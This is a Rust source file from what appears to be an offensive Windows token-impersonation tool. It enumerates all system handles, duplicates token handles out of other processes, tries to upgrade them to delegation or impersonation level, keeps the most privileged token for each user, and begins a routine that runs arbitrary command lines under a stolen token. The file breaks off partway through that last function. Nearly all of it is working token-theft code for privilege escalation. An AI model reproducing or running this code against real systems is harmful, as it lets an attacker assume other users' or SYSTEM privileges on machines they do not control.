use core::ptr::null_mut;
use std::alloc::{Layout, alloc, dealloc};
use std::io::{Error, ErrorKind};

use crate::_print;
use crate::utils::{Sid, TokenUsername};
use crate::win32::{
    advapi32::advapi32,
    def::{
        CREATE_NO_WINDOW, CREATE_UNICODE_ENVIRONMENT, ClientId, GENERIC_EXECUTE, GENERIC_READ,
        GENERIC_WRITE, IoStatusBlock, NT_SUCCESS, OBJ_CASE_INSENSITIVE, ObjectAttributes,
        PROCESS_DUP_HANDLE, PROCESS_QUERY_INFORMATION, ProcessInformation, STARTF_USESTDHANDLES,
        STATUS_BUFFER_TOO_SMALL, STATUS_INFO_LENGTH_MISMATCH, SecurityAttributes, StartupInfoW,
    },
    ntdll::{nt_current_process, nt_get_last_error, ntdll},
    utils::nt_create_named_pipe_file,
};

use winapi::ctypes::c_void;
use winapi::um::securitybaseapi::{GetSidSubAuthority, GetSidSubAuthorityCount};

#[derive(Debug, Clone)]
#[allow(dead_code)]
/// Represents a security token associated with a process.
///
/// This structure encapsulates various attributes of a token, such as its Username, Security Identifier (SID),
/// impersonation level, integrity level, token type, and more.
pub struct ProcessToken {
    /// The Security Identifier (SID) associated with the token.
    /// Used to identify the security context of the token.
    pub sid: Option<Sid>,

    /// The impersonation level of the token.
    /// Determines the extent of access the impersonated user has.
    pub impersonation_level: Option<SecurityImpersonationLevel>,

    /// The integrity level of the token.
    /// Indicates the trust level of the token (e.g., low, medium, high).
    pub integrity_level: Option<IntegrityLevel>,

    /// The elevation type of the token.
    /// Represents whether the token is limited or fully elevated.
    pub token_elevation_type: Option<TokenElevationType>,

    /// The type of the token (Primary or Impersonation).
    /// Primary tokens are used for process creation, while impersonation tokens are used to assume another identity.
    pub token_type: Option<TokenType>,

    /// A reference to the original token handle within the target process.
    pub target_process_token: *mut c_void,

    /// The Process ID (PID) of the target process that owns the token.
    pub target_process_pid: u32,

    /// A handle to the target process.
    /// Used for operations involving the process.
    pub target_process_handle: *mut c_void,

    /// The actual token handle being managed or manipulated.
    pub token_handle: *mut c_void,

    /// The username associated with the token.
    /// Represents the account name tied to the token's security context.
    pub username: Option<TokenUsername>,

    /// Whether the token is restricted.
    pub is_restricted: bool,
}

impl ProcessToken {
    /// Creates a new `ProcessToken` instance from the given handles and process information.
    ///
    /// This method extracts token attributes, including SID, token type, impersonation level,
    /// integrity level, and elevation type. It uses various helper methods to gather this data.
    ///
    /// Parameters:
    /// - `target_process_token`: Handle to the target process's token.
    /// - `target_process_pid`: Process ID (PID) of the target process.
    /// - `target_process_handle`: Handle to the target process.
    /// - `token_handle`: The actual handle to the token being managed.
    ///
    /// Returns:
    /// - `Some(ProcessToken)` if the token is successfully initialized.
    /// - `None` if any required attribute extraction fails.
    pub fn new(
        target_process_token: *mut c_void,
        target_process_pid: u32,
        target_process_handle: *mut c_void,
        token_handle: *mut c_void,
    ) -> Option<Self> {
        // Extract the token's logon SID.
        let logon_sid = ProcessToken::get_logon_sid(token_handle)?;

        // Retrieve the token type (Primary or Impersonation).
        let token_type = ProcessToken::get_token_type(token_handle)?;

        // Ensure the impersonation level is valid.
        let impersonation_level = ProcessToken::ensure_impersonation_level(token_handle)?;

        // Get the token's integrity level.
        let integrity_level = ProcessToken::get_token_integrity_level(token_handle)?;

        // Determine the token's elevation type.
        let token_elevation_type = ProcessToken::get_token_elevation_type(token_handle)?;

        // Retrieve the username associated with the token.
        let username = logon_sid.to_username();

        // Check if the token is restricted.
        let is_restricted = ProcessToken::is_token_restricted(token_handle);

        // Construct the `ProcessToken` object.
        Some(Self {
            sid: Some(logon_sid),
            impersonation_level: Some(impersonation_level),
            integrity_level: Some(integrity_level),
            token_elevation_type: Some(token_elevation_type),
            token_type: Some(token_type),
            target_process_token,
            target_process_pid,
            target_process_handle,
            token_handle,
            username,
            is_restricted,
        })
    }

    /// Closes the token handle.
    ///
    /// This method ensures the associated token handle is properly released.
    pub fn close(&self) {
        unsafe {
            // Close the token handle to release resources.
            ntdll().nt_close.run(self.token_handle);
        }
    }

    pub fn get_token_info_size(
        token_handle: *mut c_void,
        token_information_class: u32,
    ) -> Option<u32> {
        let mut buffer_size = 0;

        // Initial query to determine the required buffer size for the token information.
        let nt_status = unsafe {
            ntdll().nt_query_information_token.run(
                token_handle,
                token_information_class,
                null_mut(),
                0,
                &mut buffer_size,
            )
        };

        // If the status is not `STATUS_BUFFER_TOO_SMALL` or a success, return None.
        if nt_status != STATUS_BUFFER_TOO_SMALL && !NT_SUCCESS(nt_status) {
            return None;
        }

        // If the buffer size is zero, return early as no data can be retrieved.
        if buffer_size == 0 {
            return None;
        }

        Some(buffer_size)
    }

    pub fn get_token_info(
        token_handle: *mut c_void,
        token_information_class: u32,
    ) -> Option<Vec<u8>> {
        let mut buffer_size =
            ProcessToken::get_token_info_size(token_handle, token_information_class)?;

        // Allocate a buffer of the required size to hold the token information.
        let mut buffer: Vec<u8> = vec![0; buffer_size as usize];

        // Query the token again, this time with the allocated buffer to retrieve user information.
        let nt_status = unsafe {
            ntdll().nt_query_information_token.run(
                token_handle,
                token_information_class,
                buffer.as_mut_ptr() as *mut _,
                buffer_size,
                &mut buffer_size,
            )
        };

        // If the query fails, return None.
        if !NT_SUCCESS(nt_status) {
            return None;
        }

        Some(buffer)
    }

    /// Retrieves the logon Security Identifier (SID) from a token.
    ///
    /// This function queries the token for its user information and extracts the
    /// associated SID, which identifies the security context of the token.
    ///
    /// Parameters:
    /// - `token_handle`: Handle to the token being queried.
    ///
    /// Returns:
    /// - `Some(Sid)` if the logon SID is successfully retrieved.
    /// - `None` if the operation fails or the SID cannot be extracted.
    pub fn get_logon_sid(token_handle: *mut c_void) -> Option<Sid> {
        let buffer = ProcessToken::get_token_info(token_handle, 1)?;

        // Interpret the retrieved buffer as a TokenUser structure.
        let token_user = unsafe { &*(buffer.as_ptr() as *const TokenUser) };

        // Parse the SID from the token user structure and return it as a Sid object.
        Sid::from_ptr(token_user.user.sid)
    }

    /// Retrieves the type of a token (Primary or Impersonation).
    ///
    /// This function queries a token's information to determine its type,
    /// which is either `Primary` (used for process creation) or `Impersonation`
    /// (used for acting on behalf of another security context).
    ///
    /// Parameters:
    /// - `token_handle`: Handle to the token being queried.
    ///
    /// Returns:
    /// - `Some(TokenType)` if the token type is successfully determined.
    /// - `None` if the operation fails or the type cannot be identified.
    pub fn get_token_type(token_handle: *mut c_void) -> Option<TokenType> {
        let buffer = ProcessToken::get_token_info(token_handle, 8)?;

        // Interpret the first 4 bytes of the buffer as an integer representing the token type.
        let token_type = match buffer[0..4].try_into() {
            Ok(bytes) => i32::from_ne_bytes(bytes),
            Err(_) => {
                return None;
            }
        };

        // Map the token type value to the corresponding enum variant.
        match token_type {
            1 => Some(TokenType::Impersonation),
            2 => Some(TokenType::Primary),
            _ => None, // Return None for any unknown token type.
        }
    }

    /// Ensures the token has a valid impersonation level, upgrading it if necessary.
    ///
    /// This function checks the impersonation level of a token. If the token's impersonation
    /// level is not already set, it attempts to duplicate the token with higher impersonation
    /// levels (`Delegation` or `Impersonation`).
    ///
    /// Parameters:
    /// - `token_handle`: Handle to the token being checked or upgraded.
    ///
    /// Returns:
    /// - `Some(SecurityImpersonationLevel)` representing the effective impersonation level
    ///   of the token.
    /// - `None` if no valid impersonation level could be ensured or the operations fail.
    pub fn ensure_impersonation_level(
        token_handle: *mut c_void,
    ) -> Option<SecurityImpersonationLevel> {
        unsafe {
            // Retrieve the current impersonation level of the token.
            let mut level = ProcessToken::get_impersonation_level(token_handle);

            // If the impersonation level is not set, attempt to upgrade the token.
            if level.is_none() {
                let mut new_token: *mut c_void = null_mut();

                // Attempt to duplicate the token with Delegation level.
                let mut sqos = SecurityQualityOfService {
                    length: core::mem::size_of::<SecurityQualityOfService>() as u32,
                    impersonation_level: SecurityImpersonationLevel::Delegation as u32,
                    context_tracking_mode: 1, // SECURITY_DYNAMIC_TRACKING.
                    effective_only: 0,        // FALSE: Allows full delegation.
                };

                let mut object_attributes = ObjectAttributes {
                    length: core::mem::size_of::<ObjectAttributes>() as u32,
                    root_directory: null_mut(),
                    object_name: null_mut(),
                    attributes: 0,
                    security_descriptor: null_mut(),
                    security_quality_of_service: &mut sqos as *mut _ as *mut c_void,
                };

                // Duplicate the token into an impersonation token.
                let nt_status = ntdll().nt_duplicate_token.run(
                    token_handle,
                    TOKEN_ELEVATION,
                    &mut object_attributes,
                    0,
                    TokenType::Impersonation as u32,
                    &mut new_token,
                );

                if !NT_SUCCESS(nt_status) {
                    _print!(
                        "[-] NtDuplicateToken for delegation failed with status: {:#X}",
                        nt_status
                    );
                    return None;
                }

                if nt_status == 0 {
                    // If successful, set the level to Delegation and close the duplicated token handle.
                    level = Some(SecurityImpersonationLevel::Delegation);
                    ntdll().nt_close.run(new_token);
                } else {
                    // If Delegation fails, attempt to duplicate the token with Impersonation level.
                    let mut sqos = SecurityQualityOfService {
                        length: core::mem::size_of::<SecurityQualityOfService>() as u32,
                        impersonation_level: SecurityImpersonationLevel::Impersonation as u32,
                        context_tracking_mode: 1, // SECURITY_DYNAMIC_TRACKING.
                        effective_only: 0,        // FALSE: Allows full delegation.
                    };

                    let mut object_attributes = ObjectAttributes {
                        length: core::mem::size_of::<ObjectAttributes>() as u32,
                        root_directory: null_mut(),
                        object_name: null_mut(),
                        attributes: 0,
                        security_descriptor: null_mut(),
                        security_quality_of_service: &mut sqos as *mut _ as *mut c_void,
                    };

                    // Duplicate the token into an impersonation token.
                    let nt_status = ntdll().nt_duplicate_token.run(
                        token_handle,
                        TOKEN_ELEVATION,
                        &mut object_attributes,
                        0,
                        TokenType::Impersonation as u32,
                        &mut new_token,
                    );

                    if !NT_SUCCESS(nt_status) {
                        _print!(
                            "[-] NtDuplicateToken for impersonation failed with status: {:#X}",
                            nt_status
                        );
                        return None;
                    }

                    if nt_status == 0 {
                        // If successful, set the level to Impersonation and close the duplicated token handle.
                        level = Some(SecurityImpersonationLevel::Impersonation);
                        ntdll().nt_close.run(new_token);
                    } else {
                        // If both attempts fail, return None.
                        return None;
                    }
                }
            }

            // Return the determined or upgraded impersonation level.
            level
        }
    }

    /// Retrieves the impersonation level of a given token.
    ///
    /// This function queries the token to determine its impersonation level, which
    /// dictates the degree of access and control the token provides for impersonation.
    ///
    /// Parameters:
    /// - `token_handle`: Handle to the token being queried.
    ///
    /// Returns:
    /// - `Some(SecurityImpersonationLevel)` representing the impersonation level of the token.
    /// - `None` if the query fails or the impersonation level is invalid.
    pub fn get_impersonation_level(
        token_handle: *mut c_void,
    ) -> Option<SecurityImpersonationLevel> {
        let buffer = ProcessToken::get_token_info(token_handle, 9)?;

        // Interpret the impersonation level from the retrieved data.
        let level = match buffer[0..4].try_into() {
            Ok(bytes) => i32::from_ne_bytes(bytes),
            Err(_) => {
                return None;
            }
        };

        match level {
            0 => Some(SecurityImpersonationLevel::Anonymous),
            1 => Some(SecurityImpersonationLevel::Identification),
            2 => Some(SecurityImpersonationLevel::Impersonation),
            3 => Some(SecurityImpersonationLevel::Delegation),
            _ => None, // Return None for unknown or unsupported levels.
        }
    }

    /// Retrieves the integrity level of a given token.
    ///
    /// This function queries the token's `TokenIntegrityLevel` information to determine
    /// its integrity level. The integrity level defines the trust level of the token,
    /// such as Low, Medium, or High integrity.
    ///
    /// Parameters:
    /// - `token_handle`: Handle to the token being queried.
    ///
    /// Returns:
    /// - `Some(IntegrityLevel)` representing the integrity level of the token.
    /// - `None` if the query fails or the integrity level cannot be determined.
    pub fn get_token_integrity_level(token_handle: *mut c_void) -> Option<IntegrityLevel> {
        unsafe {
            let buffer = ProcessToken::get_token_info(token_handle, 25)?;

            // Extract the TOKEN_MANDATORY_LABEL structure from the buffer.
            let token_label = &*(buffer.as_ptr() as *const TokenMandatoryLabel);
            let sid_ptr = token_label.label.sid;

            if sid_ptr.is_null() {
                // The SID pointer is null, indicating an issue.
                return None;
            }

            // Retrieve the Relative Identifier (RID) from the SID.
            let sub_auth_count = *GetSidSubAuthorityCount(sid_ptr) as usize;
            if sub_auth_count == 0 {
                // No sub-authorities found in the SID.
                return None;
            }

            let rid_ptr = GetSidSubAuthority(sid_ptr, (sub_auth_count - 1) as u32);
            if rid_ptr.is_null() {
                // Failed to retrieve the RID pointer.
                return None;
            }

            let rid = *rid_ptr;

            // Map the RID to the corresponding IntegrityLevel.
            Some(match rid {
                0x00001000 => IntegrityLevel::LowIntegrity,
                0x00002000 => IntegrityLevel::MediumIntegrity,
                0x00002100 => IntegrityLevel::MediumHighIntegrity,
                0x00003000 => IntegrityLevel::HighIntegrity,
                0x00004000 => IntegrityLevel::SystemIntegrity,
                0x00005000 => IntegrityLevel::ProtectedProcess,
                _ => IntegrityLevel::Untrusted, // Default for unknown RIDs.
            })
        }
    }

    /// Retrieves the elevation type of a given token.
    ///
    /// The token elevation type indicates whether the token is a full elevated token,
    /// a limited token, or a default token, providing insights into the token's privilege level.
    ///
    /// Parameters:
    /// - `token_handle`: Handle to the token being queried.
    ///
    /// Returns:
    /// - `Some(TokenElevationType)` representing the elevation type of the token.
    /// - `None` if the query fails or the elevation type cannot be determined.
    pub fn get_token_elevation_type(token_handle: *mut c_void) -> Option<TokenElevationType> {
        let buffer = ProcessToken::get_token_info(token_handle, 18)?;

        // Extract the elevation type as an integer.
        let elevation_type = match buffer[0..4].try_into() {
            Ok(bytes) => u32::from_ne_bytes(bytes),
            Err(_) => {
                return None;
            }
        };

        // Map the integer to the corresponding TokenElevationType enum.
        match elevation_type {
            1 => Some(TokenElevationType::Default), // Default token type.
            2 => Some(TokenElevationType::Full),    // Full elevated token.
            3 => Some(TokenElevationType::Limited), // Limited token with restricted privileges.
            _ => {
                _print!("[-] Unknown token ELEVATION TYPE : {}", elevation_type);
                None
            }
        }
    }

    /// Duplicates a token, converting it to a primary token if necessary.
    ///
    /// This function checks the type of the current token. If the token is of type `Primary`,
    /// it returns the token handle directly. Otherwise, it duplicates the token and returns
    /// a new handle to a primary token.
    ///
    /// Returns:
    /// - `Ok(HANDLE)` with the handle to the primary token.
    /// - `Err(u32)` containing the error code if duplication fails.
    pub fn duplicate_token_ex(&self) -> Result<*mut c_void, u32> {
        unsafe {
            let mut buffer_size = 0;

            // Initial query to determine the required buffer size for the token type information.
            let mut nt_status = ntdll().nt_query_information_token.run(
                self.token_handle,
                8,
                null_mut(),
                0,
                &mut buffer_size,
            );

            // If the status is not `STATUS_BUFFER_TOO_SMALL` or a success, return None.
            if nt_status != STATUS_BUFFER_TOO_SMALL && !NT_SUCCESS(nt_status) {
                return Err(nt_get_last_error());
            }

            // If the buffer size is zero, return early as no data can be retrieved.
            if buffer_size == 0 {
                return Err(nt_get_last_error());
            }

            // Allocate a buffer of the required size to hold the token type information.
            let mut buffer: Vec<u8> = vec![0; buffer_size as usize];

            // Query the token again with the allocated buffer to retrieve the token type.
            nt_status = ntdll().nt_query_information_token.run(
                self.token_handle,
                8,
                buffer.as_mut_ptr() as *mut _,
                buffer_size,
                &mut buffer_size,
            );

            // If the query fails, return None.
            if !NT_SUCCESS(nt_status) {
                return Err(nt_get_last_error());
            }

            // Interpret the first 4 bytes of the buffer as an integer representing the token type.
            let token_type = match buffer[0..4].try_into() {
                Ok(bytes) => i32::from_ne_bytes(bytes),
                Err(_) => {
                    return Err(nt_get_last_error());
                }
            };

            // If the token is already a primary token, return its handle directly.
            if token_type == TokenType::Primary as i32 {
                return Ok(self.token_handle);
            }

            // Prepare a handle for the duplicated token.
            let mut duplicated: *mut c_void = core::ptr::null_mut();

            // Duplicate the token, converting it to a primary token.
            let mut sqos = SecurityQualityOfService {
                length: core::mem::size_of::<SecurityQualityOfService>() as u32,
                impersonation_level: SecurityImpersonationLevel::Impersonation as u32,
                context_tracking_mode: 1, // SECURITY_DYNAMIC_TRACKING.
                effective_only: 0,        // FALSE: Allows full delegation.
            };

            let mut object_attributes = ObjectAttributes {
                length: core::mem::size_of::<ObjectAttributes>() as u32,
                root_directory: null_mut(),
                object_name: null_mut(),
                attributes: 0,
                security_descriptor: null_mut(),
                security_quality_of_service: &mut sqos as *mut _ as *mut c_void,
            };

            // Duplicate the token into an impersonation token.
            let nt_status = ntdll().nt_duplicate_token.run(
                self.token_handle,
                TOKEN_ELEVATION,
                &mut object_attributes,
                0,
                TokenType::Primary as u32,
                &mut duplicated,
            );

            if !NT_SUCCESS(nt_status) {
                _print!("[-] NtDuplicateToken failed with status: {:#X}", nt_status);
                return Err(nt_get_last_error());
            }

            // Return the handle to the duplicated token.
            Ok(duplicated)
        }
    }

    pub fn is_token_restricted(token_handle: *mut c_void) -> bool {
        // Use the existing helper to retrieve the token information
        let buffer_opt = ProcessToken::get_token_info(token_handle, 11);

        if buffer_opt.is_none() {
            return false; // Return false if the token information couldn't be retrieved
        }

        let buffer = buffer_opt.unwrap();

        // SAFETY: buffer is valid and points to a TOKEN_GROUPS structure
        let token_groups = unsafe { &*(buffer.as_ptr() as *const TokenGroups) };
        token_groups.group_count != 0 // Return true if the token has restricted SIDs
    }
}

#[cfg(feature = "verbose")]
use core::fmt;

#[cfg(feature = "verbose")]
impl fmt::Display for ProcessToken {
    /// Formats the `ProcessToken` for display.
    ///
    /// Outputs all fields of the `ProcessToken` struct, each on a new line, formatted
    /// for readability. Handles optional fields gracefully, displaying "None" if they are unset.
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "[+] Token Details:")?;
        writeln!(
            f,
            "   Token Username: {}",
            self.username
                .clone()
                .unwrap_or_else(|| TokenUsername::new(String::from("?"), String::from("?")))
        )?;
        writeln!(f, "   Target Process PID: {}", self.target_process_pid)?;
        writeln!(
            f,
            "   Target Process Handle: 0x{:X}",
            self.target_process_handle as usize
        )?;
        writeln!(
            f,
            "   Target Process Token Handle: 0x{:X}",
            self.target_process_token as usize
        )?;
        writeln!(f, "   Token Handle: 0x{:X}", self.token_handle as usize)?;
        writeln!(
            f,
            "   SID: {}",
            self.sid
                .as_ref()
                .map(|sid| sid.value.clone())
                .unwrap_or_else(|| String::from("None"))
        )?;
        writeln!(
            f,
            "   Impersonation Level: {}",
            self.impersonation_level
                .map(|level| format!("{:?}", level))
                .unwrap_or_else(|| String::from("None"))
        )?;
        writeln!(
            f,
            "   Integrity Level: {}",
            self.integrity_level
                .map(|level| format!("{:?}", level))
                .unwrap_or_else(|| String::from("None"))
        )?;
        writeln!(
            f,
            "   Token Elevation Type: {}",
            self.token_elevation_type
                .map(|elevation| format!("{:?}", elevation))
                .unwrap_or_else(|| String::from("None"))
        )?;
        writeln!(
            f,
            "   Token Type: {}",
            self.token_type
                .map(|t| format!("{:?}", t))
                .unwrap_or_else(|| String::from("None"))
        )?;
        writeln!(f, "   Is Restricted: {}", self.is_restricted)
    }
}

pub fn handle_at(handle_info_ptr: *const u8, index: usize) -> Option<SystemHandleTableEntryInfoEx> {
    if handle_info_ptr.is_null() {
        // Return None if the handle info pointer is null
        return None;
    }

    unsafe {
        // Calculate the address of the entry at the specified index
        let entry_ptr = handle_info_ptr.add(
            std::mem::size_of::<SystemHandleInformationEx>()
                + index * std::mem::size_of::<SystemHandleTableEntryInfoEx>(),
        );

        // Return None if the calculated entry pointer is null
        if entry_ptr.is_null() {
            return None;
        }

        // Safely read and return the handle entry at the calculated address
        Some(std::ptr::read(
            entry_ptr as *const SystemHandleTableEntryInfoEx,
        ))
    }
}

/// Retrieves a list of system handles using `NtQuerySystemInformation`.
///
/// This function queries the system for extended handle information and returns a vector
/// of `SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX` structures, which represent system handles
/// currently open across all processes.
///
/// The function dynamically allocates memory for the query results, automatically resizing
/// the buffer if the initially allocated memory is insufficient. Rust's `std::alloc` is
/// used for safe memory allocation and deallocation.
///
/// # Returns
/// - A `Vec<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>` containing the details of all system handles.
///
/// # Notes
/// - If memory allocation fails or the system query encounters an error, the function returns
///   an empty vector.
/// - Memory is properly allocated and deallocated using Rust's `std::alloc` module.
pub fn list_system_handles() -> Vec<SystemHandleTableEntryInfoEx> {
    let mut result = Vec::new();
    let mut handle_info_size = 1024 * 1024; // Initial buffer size of 1 MB
    let mut return_size: u32 = 0;

    loop {
        unsafe {
            // Define memory layout for the current buffer size
            let layout = Layout::from_size_align(handle_info_size, std::mem::align_of::<u8>());

            if layout.is_err() {
                // Return empty result if the layout size is zero
                return result;
            }

            let layout = layout.unwrap();

            // Allocate memory using std::alloc
            let handle_info_ptr = alloc(layout);
            if handle_info_ptr.is_null() {
                _print!("[-] Failed to allocate memory for handle information");
                return result; // Return empty result if allocation fails
            }

            // Query system information for handle details
            let status = ntdll().nt_query_system_information.run(
                64, // SystemExtendedHandleInformation
                handle_info_ptr as *mut _,
                handle_info_size as u32,
                &mut return_size,
            );

            // Check if the buffer size was insufficient
            if status == STATUS_INFO_LENGTH_MISMATCH {
                // Free the current buffer and retry with a larger size
                dealloc(handle_info_ptr, layout);
                handle_info_size *= 2; // Double the buffer size
                continue;
            } else if status < 0 {
                // If another error occurred, free memory and exit
                _print!(
                    "[-] NtQuerySystemInformation failed with status: 0x{:08X}",
                    status
                );
                dealloc(handle_info_ptr, layout);
                break;
            }

            // Cast the buffer to a SYSTEM_HANDLE_INFORMATION_EX structure
            let handle_info = handle_info_ptr as *const SystemHandleInformationEx;

            // Iterate through the handles and collect the entries
            for i in 0..(*handle_info).number_of_handles as usize {
                if let Some(handle_entry) = handle_at(handle_info_ptr, i) {
                    result.push(handle_entry);
                }
            }

            // Free the allocated memory
            dealloc(handle_info_ptr, layout);
            break;
        }
    }

    result
}

/// Adds a process token to the list or updates an existing one if conditions are met.
///
/// This function performs the following actions:
/// - Skips processing if the provided token handle is null.
/// - Iterates through the existing tokens to find a matching SID.
/// - If a matching SID is found:
///     - Replaces the existing token if its impersonation level is the same
///       or if the new token has a higher impersonation level and elevation.
///     - Ensures the token is not restricted before replacing.
/// - If no matching SID is found, adds the token to the list.
///
/// Parameters:
/// - `tokens`: A mutable reference to a vector of `ProcessToken` objects.
/// - `process_token`: The `ProcessToken` to be added or checked against the list.
///
/// Behavior:
/// - Ensures safe comparison of token SIDs without using `unwrap`.
/// - Closes the new token handle if it does not qualify for replacement.
/// - Prevents duplication by checking for existing SIDs in the token list.
fn put_token(tokens: &mut Vec<ProcessToken>, process_token: ProcessToken) {
    // Skip if the provided token handle is null
    if process_token.token_handle.is_null() {
        return;
    }

    // Iterate through the existing tokens
    for i in 0..tokens.len() {
        let process_token_node = &mut tokens[i];

        // Compare the SIDs safely, ensuring both are present
        if let (Some(node_sid), Some(process_sid)) = (&process_token_node.sid, &process_token.sid) {
            // Check if the SIDs match
            if node_sid.value == process_sid.value {
                // Replace the token if conditions are met
                if process_token_node.impersonation_level == process_token.impersonation_level
                    || (process_token.impersonation_level
                        >= Some(SecurityImpersonationLevel::Impersonation)
                        && process_token.impersonation_level
                            > process_token_node.impersonation_level
                        && (process_token.token_elevation_type == Some(TokenElevationType::Full)
                            || process_token.integrity_level > process_token_node.integrity_level))
                {
                    // Ensure the token is not restricted
                    if !process_token.is_restricted {
                        process_token_node.close(); // Close the existing token
                        tokens[i] = process_token; // Replace with the new token
                    }
                } else {
                    process_token.close(); // Close the new token if it doesn't qualify
                }
                return; // Exit after handling the token
            }
        }
    }

    // Add the token to the list if no matching SID was found
    tokens.push(process_token);
}

/// Retrieves a handle to a process with the specified PID and desired access rights using the NT
/// API.
///
/// This function opens a handle to a target process by specifying its process ID (PID) and the
/// desired access rights. The syscall `NtOpenProcess` is used to obtain the handle, and the
/// function initializes the required structures (`OBJECT_ATTRIBUTES` and `CLIENT_ID`) needed to
/// make the system call.
///
/// # Safety
/// This function involves unsafe operations, including raw pointer dereferencing and direct system
/// calls. Ensure that the parameters passed to the function are valid and the function is called in
/// a safe context.
///
/// # Parameters
/// - `pid`: The process ID of the target process.
/// - `desired_access`: The desired access rights for the process handle, specified as an
///   `AccessMask`.
///
/// # Returns
/// A handle to the process if successful, otherwise `null_mut()` if the operation fails.
pub fn get_process_handle(pid: i32, desired_access: u32) -> Option<*mut c_void> {
    let mut process_handle: *mut c_void = null_mut();

    // Initialize object attributes for the process, setting up the basic structure with default
    // options.
    let mut object_attributes = ObjectAttributes::new();

    ObjectAttributes::initialize(
        &mut object_attributes,
        null_mut(),           // No name for the object.
        OBJ_CASE_INSENSITIVE, // Case-insensitive name comparison.
        null_mut(),           // No root directory.
        null_mut(),           // No security descriptor.
    );

    // Initialize client ID structure with the target process ID.
    let mut client_id = ClientId::new();
    client_id.unique_process = pid as *mut c_void;

    // Perform a system call to NtOpenProcess to obtain a handle to the specified process.
    unsafe {
        let nt_status = ntdll().nt_open_process.run(
            &mut process_handle, // Pointer to the handle that will receive the process handle.
            desired_access,      // Specify the access rights desired for the process handle.
            &mut object_attributes, // Provide the object attributes for the process.
            &mut client_id,      // Pass the client ID (target process ID).
        );

        // Check if the operation was successful and return the process handle.
        if !NT_SUCCESS(nt_status) {
            return None;
        }
    };

    Some(process_handle) // Return the obtained process handle, or `null_mut()` if the operation fails.
}

/// Iterates through system handles and retrieves tokens for specified or all processes.
///
/// This function collects and processes tokens from system handles, filtering by a specified target PID
/// or all PIDs if no target is provided. For each valid token found, a user-provided callback is invoked
/// to process or filter the token. If the callback returns `false`, the function stops further iteration.
///
/// # Parameters
/// - `target_pid`: An optional `i32` specifying the target PID to filter tokens. If `None`, tokens for all
///   processes are retrieved.
/// - `callback`: A function or closure to process each `ProcessToken`. It receives a `ProcessToken` and
///   returns `true` to continue or `false` to stop further processing.
///
/// # Behavior
/// - Retrieves system handles via `list_system_handles`.
/// - Iterates through each handle, identifying and processing tokens for the specified or all PIDs.
/// - Ensures each unique PID is handled only once per iteration.
/// - Skips invalid or inaccessible handles, as well as non-token objects.
/// - Calls the user-provided callback for each valid `ProcessToken`.
pub fn list_process_tokens<F>(target_pid: Option<i32>, mut callback: F)
where
    F: FnMut(ProcessToken) -> bool,
{
    // Retrieve all system handles
    let system_handles = list_system_handles();
    let local_process_handle = nt_current_process();
    let mut process_handle: Option<*mut c_void> = None;
    let mut last_pid: i32 = -1;
    let mut process_tokens = Vec::new();

    // Iterate through each system handle
    for handle_entry in system_handles.iter() {
        let handle_pid = handle_entry.unique_process_id as u32;

        // Check if the handle matches the target PID or if processing all PIDs
        if target_pid.map_or(true, |pid| handle_pid == pid as u32) {
            // Open the process only once per unique PID
            if last_pid != handle_pid as i32 {
                // Close the previously opened process handle, if any
                if !process_handle.is_none() {
                    unsafe { ntdll().nt_close.run(process_handle.unwrap()) };
                }

                // Open the process to query its tokens
                process_handle = get_process_handle(
                    handle_pid as i32,
                    PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
                );

                // If the process handle is valid, retrieve and process its primary token
                if !process_handle.is_none() {
                    let mut token_handle = std::ptr::null_mut();

                    let nt_status = unsafe {
                        ntdll().nt_open_process_token.run(
                            process_handle.unwrap(),
                            TOKEN_ELEVATION,
                            &mut token_handle,
                        )
                    };

                    if nt_status == 0 {
                        if let Some(token) = ProcessToken::new(
                            null_mut(),
                            handle_pid,
                            process_handle.unwrap(),
                            token_handle,
                        ) {
                            _print!("{}", token);
                            // Pass the token to the user-provided callback
                            if callback(token.clone()) {
                                put_token(&mut process_tokens, token);
                            } else {
                                unsafe { ntdll().nt_close.run(token_handle) };
                                break;
                            }
                        }
                    }
                }

                last_pid = handle_pid as i32;
            }

            // Skip if the process handle is invalid
            if process_handle.is_none() {
                continue;
            }

            // Skip non-token handles or restricted access handles
            if handle_entry.object_type_index != 0x5 || handle_entry.granted_access == 0x0012019F {
                continue;
            }

            // Attempt to duplicate the handle
            let mut dup_handle: *mut c_void = std::ptr::null_mut();

            let nt_status = ntdll().nt_duplicate_object.run(
                process_handle.unwrap(),
                handle_entry.handle_value as *mut c_void,
                local_process_handle,
                &mut dup_handle,
                GENERIC_EXECUTE | GENERIC_READ | GENERIC_WRITE,
                0,
                0,
            );

            // If the handle is successfully duplicated, create and process a token
            if nt_status == 0 && !dup_handle.is_null() {
                if let Some(token) = ProcessToken::new(
                    handle_entry.handle_value as *mut c_void,
                    handle_pid,
                    process_handle.unwrap(),
                    dup_handle,
                ) {
                    _print!("{}", token);

                    // Pass the token to the user-provided callback
                    if callback(token.clone()) {
                        put_token(&mut process_tokens, token);
                    } else {
                        unsafe { ntdll().nt_close.run(dup_handle) };
                        break;
                    }
                }
            }

            last_pid = handle_pid as i32;
        }
    }
}

/// Creates a process with the specified token and retrieves its output via a pipe.
///
/// This function uses the `CreateProcessWithTokenW` API to create a new process under the
/// security context of the specified token. The standard output and error streams of the
/// created process are captured via a pipe and returned as a `String`.
///
/// # Parameters
/// - `token`: A handle to the security token used to create the new process.
/// - `cmd_line`: The command line string to execute in the new process.
///
/// # Returns
/// - `Ok(String)` containing the combined standard output and error output of the created process.
/// - `Err(std::io::Error)` if the process creation or pipe operations fail.
///
/// # Behavior
/// - Sets up a pipe to capture the standard output and error streams of the process.
/// - Uses the provided token to create the process with `CreateProcessWithTokenW`.
/// - Reads the output from the process's standard output stream until it terminates.
pub fn create_process_with_token_w_piped(
    token: *mut c_void,
    cmd_line: &str,
) -> Result<String, std::io::Error> {
    // Security attributes for pipe creation (allows handle inheritance)
    let mut sa = SecurityAttributes {
        n_length: core::mem::size_of::<SecurityAttributes>() as u32,
        lp_security_descriptor: null_mut(),
        b_inherit_handle: true,
    };

    let mut child_stdout_read: *mut c_void = null_mut();
    let mut child_stdout_write: *mut c_void = null_mut();

    // Create a pipe for the child process's standard output and error streams
    let status = unsafe {
        nt_create_named_pipe_file(
            &mut child_stdout_read,
            &mut child_stdout_write,
            &mut sa,
            0, // Use the default buffer size of 4096 bytes.
            1,
        )
    };

    if !NT_SUCCESS(status) {
